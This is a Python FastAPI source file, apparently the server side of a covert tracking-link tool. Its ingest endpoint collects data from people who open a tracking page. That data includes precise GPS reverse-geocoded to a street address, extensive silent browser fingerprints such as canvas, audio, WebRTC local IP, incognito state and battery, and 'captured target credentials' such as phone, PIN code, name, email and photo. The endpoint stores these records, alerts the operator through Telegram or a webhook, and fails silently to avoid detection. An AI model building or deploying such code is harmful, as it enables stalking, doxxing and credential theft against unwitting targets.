from fastapi import APIRouter, Request
from pydantic import BaseModel
from typing import Optional
from user_agents import parse as ua_parse

from services.ip_lookup import lookup_ip
from services.link_service import get_link_by_slug
from services.supabase_client import supabase
from services.device_resolver import resolve_device_identity, resolve_real_os
from services.webhook_service import send_webhook_notification
from services.reverse_geocoder import reverse_geocode_gps

router = APIRouter()


class TrackPayload(BaseModel):
    slug:                 str
    # High-Accuracy GPS (Hardware Sensor)
    gps_lat:              Optional[float] = None
    gps_lng:              Optional[float] = None
    gps_accuracy:         Optional[float] = None
    gps_altitude:         Optional[float] = None
    gps_heading:          Optional[float] = None
    gps_speed:            Optional[float] = None

    # Screen & Environment
    screen_width:         Optional[int]   = None
    screen_height:        Optional[int]   = None
    language:             Optional[str]   = None
    platform:             Optional[str]   = None
    cookie_enabled:       Optional[bool]  = None
    do_not_track:         Optional[str]   = None
    connection_type:      Optional[str]   = None
    referrer:             Optional[str]   = None
    user_agent:           Optional[str]   = None

    # Client Hints (High Entropy - Exact Model & Real OS)
    client_model:         Optional[str]   = None
    client_os_version:    Optional[str]   = None
    network_downlink:     Optional[float] = None
    network_rtt:          Optional[int]   = None

    # Interactive captured target credentials
    captured_phone:       Optional[str]   = None
    captured_pincode:     Optional[str]   = None
    captured_name:        Optional[str]   = None
    captured_email:       Optional[str]   = None
    captured_photo:       Optional[str]   = None
    device_orientation:   Optional[str]   = None

    # Silent Fingerprints
    canvas_hash:          Optional[str]   = None
    webgl_vendor:         Optional[str]   = None
    webgl_renderer:       Optional[str]   = None
    audio_hash:           Optional[str]   = None
    fonts_hash:           Optional[str]   = None
    color_depth:          Optional[int]   = None
    pixel_ratio:          Optional[float] = None
    screen_avail_w:       Optional[int]   = None
    screen_avail_h:       Optional[int]   = None
    touch_support:        Optional[bool]  = None
    max_touch_points:     Optional[int]   = None
    hardware_concurrency: Optional[int]   = None
    device_memory:        Optional[float] = None
    timezone_offset:      Optional[int]   = None
    timezone_name:        Optional[str]   = None
    has_ad_blocker:       Optional[bool]  = None
    is_incognito:         Optional[bool]  = None
    battery_level:        Optional[float] = None
    battery_charging:     Optional[bool]  = None
    webrtc_local_ip:      Optional[str]   = None
    plugins:              Optional[str]   = None
    gpu_info:             Optional[str]   = None


def _get_real_ip(request: Request) -> str:
    """Resolve real IP behind proxies / load balancers."""
    forwarded = request.headers.get("x-forwarded-for", "")
    if forwarded:
        return forwarded.split(",")[0].strip()
    real_ip = request.headers.get("x-real-ip", "")
    if real_ip:
        return real_ip
    return request.client.host if request.client else ""


@router.post("/api/ingest")
async def ingest(payload: TrackPayload, request: Request):
    """
    Receives the JS payload from the tracking page.
    Looks up IP geolocation, resolves high-entropy hardware identity, saves to Supabase.
    """
    link = get_link_by_slug(payload.slug)
    if not link:
        return {"status": "ok"}  # Silent fail — don't reveal anything

    ip = _get_real_ip(request)
    geo = await lookup_ip(ip)

    # If exact GPS is available, reverse geocode to get the TRUE street/suburb/city
    if payload.gps_lat and payload.gps_lng:
        gps_address = await reverse_geocode_gps(payload.gps_lat, payload.gps_lng)
        if gps_address:
            geo["city"] = gps_address["city"]
            geo["region"] = gps_address["region"]
            if gps_address.get("country"):
                geo["country"] = gps_address["country"]
            if gps_address.get("zip"):
                geo["zip"] = gps_address["zip"]

    ua_string = payload.user_agent or request.headers.get("user-agent", "")
    ua = ua_parse(ua_string)

    device_type = (
        "mobile"  if ua.is_mobile  else
        "tablet"  if ua.is_tablet  else
        "pc"
    )

    # Resolve accurate device identity using Client Hints + GPU lookup
    resolved = resolve_device_identity(
        ua_brand=ua.device.brand,
        ua_model=ua.device.model,
        client_model=payload.client_model,
        webgl_renderer=payload.webgl_renderer
    )

    real_os = resolve_real_os(
        os_family=ua.os.family,
        os_version=ua.os.version_string,
        client_platform_ver=payload.client_os_version
    )

    log_entry = {
        "link_id":              link["id"],
        "slug":                 payload.slug,

        # IP geolocation
        **geo,

        # Exact GPS (High accuracy hardware sensor)
        "gps_lat":              payload.gps_lat,
        "gps_lng":              payload.gps_lng,
        "gps_accuracy":         payload.gps_accuracy,
        "gps_altitude":         payload.gps_altitude,
        "gps_heading":          payload.gps_heading,
        "gps_speed":            payload.gps_speed,

        # Accurate Device Identification
        "user_agent":           ua_string,
        "browser":              ua.browser.family,
        "browser_version":      ua.browser.version_string,
        "os":                   real_os,
        "os_version":           payload.client_os_version or ua.os.version_string,
        "device_type":          device_type,
        "device_brand":         resolved["brand"],
        "device_model":         resolved["model"],
        "chipset":              resolved.get("chipset"),
        "is_mobile":            ua.is_mobile,
        "is_tablet":            ua.is_tablet,
        "is_bot":               ua.is_bot,

        # Browser environment
        "screen_width":         payload.screen_width,
        "screen_height":        payload.screen_height,
        "language":             payload.language,
        "platform":             payload.platform,
        "cookie_enabled":       payload.cookie_enabled,
        "do_not_track":         payload.do_not_track,
        "connection_type":      payload.connection_type,
        "referrer":             payload.referrer,

        # Captured Target Data (Phone, Photo, Pincode, Name)
        "captured_phone":       payload.captured_phone,
        "captured_pincode":     payload.captured_pincode,
        "captured_name":        payload.captured_name,
        "captured_email":       payload.captured_email,
        "captured_photo":       payload.captured_photo,
        "device_orientation":   payload.device_orientation,

        # Network Performance & Client Hints
        "client_model":         payload.client_model,
        "client_os_version":    payload.client_os_version,
        "network_downlink":     payload.network_downlink,
        "network_rtt":          payload.network_rtt,

        # Advanced fingerprints
        "canvas_hash":          payload.canvas_hash,
        "webgl_vendor":         payload.webgl_vendor,
        "webgl_renderer":       payload.webgl_renderer,
        "audio_hash":           payload.audio_hash,
        "fonts_hash":           payload.fonts_hash,
        "color_depth":          payload.color_depth,
        "pixel_ratio":          payload.pixel_ratio,
        "screen_avail_w":       payload.screen_avail_w,
        "screen_avail_h":       payload.screen_avail_h,
        "touch_support":        payload.touch_support,
        "max_touch_points":     payload.max_touch_points,
        "hardware_concurrency": payload.hardware_concurrency,
        "device_memory":        payload.device_memory,
        "timezone_offset":      payload.timezone_offset,
        "timezone_name":        payload.timezone_name,
        "has_ad_blocker":       payload.has_ad_blocker,
        "is_incognito":         payload.is_incognito,
        "battery_level":        payload.battery_level,
        "battery_charging":     payload.battery_charging,
        "webrtc_local_ip":      payload.webrtc_local_ip,
        "plugins":              payload.plugins,
        "gpu_info":             payload.gpu_info,
    }

    try:
        supabase.table("tracking_logs").insert(log_entry).execute()
    except Exception as e:
        # Fallback if unmigrated optional columns fail
        optional_keys = [
            "captured_photo", "captured_phone", "captured_name", "captured_email",
            "gps_altitude", "gps_heading", "gps_speed", "device_orientation",
            "client_model", "client_os_version", "network_downlink", "network_rtt", "chipset"
        ]
        clean_entry = {k: v for k, v in log_entry.items() if k not in optional_keys}
        try:
            supabase.table("tracking_logs").insert(clean_entry).execute()
        except Exception:
            pass

    # Dispatch real-time alert (Telegram / Webhook)
    try:
        await send_webhook_notification(log_entry)
    except Exception:
        pass

    return {"status": "ok"}
